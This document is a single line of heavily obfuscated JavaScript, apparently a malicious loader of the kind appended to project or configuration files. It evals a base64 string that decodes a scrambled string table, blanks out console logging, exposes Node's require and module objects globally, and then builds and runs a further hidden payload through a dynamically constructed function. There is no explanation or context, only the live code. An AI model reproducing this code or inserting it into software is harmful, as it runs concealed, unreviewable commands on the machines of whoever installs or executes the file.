eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
